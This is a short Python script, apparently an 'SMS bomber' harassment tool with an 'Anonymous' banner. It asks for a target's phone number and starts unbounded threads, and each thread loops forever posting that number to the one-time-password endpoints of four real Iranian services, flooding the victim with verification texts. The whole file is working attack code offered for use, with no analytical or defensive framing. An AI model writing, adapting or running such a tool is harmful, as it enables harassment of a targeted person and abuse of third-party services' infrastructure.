import requests , os , threading

os.system('cls' if os.name == 'nt' else 'clear')
banner = '''
  █████████  ██████   ██████  █████████             ███████████     ███████    ██████   ██████ ███████████  ██████████ ███████████  
 ███░░░░░███░░██████ ██████  ███░░░░░███           ░░███░░░░░███  ███░░░░░███ ░░██████ ██████ ░░███░░░░░███░░███░░░░░█░░███░░░░░███ 
░███    ░░░  ░███░█████░███ ░███    ░░░             ░███    ░███ ███     ░░███ ░███░█████░███  ░███    ░███ ░███  █ ░  ░███    ░███ 
░░█████████  ░███░░███ ░███ ░░█████████  ██████████ ░██████████ ░███      ░███ ░███░░███ ░███  ░██████████  ░██████    ░██████████  
 ░░░░░░░░███ ░███ ░░░  ░███  ░░░░░░░░███░░░░░░░░░░  ░███░░░░░███░███      ░███ ░███ ░░░  ░███  ░███░░░░░███ ░███░░█    ░███░░░░░███ 
 ███    ░███ ░███      ░███  ███    ░███            ░███    ░███░░███     ███  ░███      ░███  ░███    ░███ ░███ ░   █ ░███    ░███ 
░░█████████  █████     █████░░█████████             ███████████  ░░░███████░   █████     █████ ███████████  ██████████ █████   █████
 ░░░░░░░░░  ░░░░░     ░░░░░  ░░░░░░░░░             ░░░░░░░░░░░     ░░░░░░░    ░░░░░     ░░░░░ ░░░░░░░░░░░  ░░░░░░░░░░ ░░░░░   ░░░░░ 
                                                                                                                                    
                                                                                                                                    
                                                                                                                                    '''
print(banner)
print("CREATE BY YASIN BM ... WE ARE ANONYMOUSE")
target = input("Enter target phone number with out +98 : ")

def attack():
    while True:
        url = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
        url2 = "https://auth.basalam.com/otp-request"
        url3 = "https://www.miare.ir/api/otp/driver/request/"
        url4 = "https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one"
        number = {"cellphone":target}
        requests.post(url,data=number)
        number2 = {"mobile":target}
        requests.post(url2,data=number2)
        number3 = {"phone_mobile":target}
        requests.post(url3,data=number3)
        number4 = {"phone":target}
        requests.post(url4,data=number4)
        print(f"Bombering this number {target} ====> ")

while True:
    t = threading.Thread(target=attack)
    t.start()
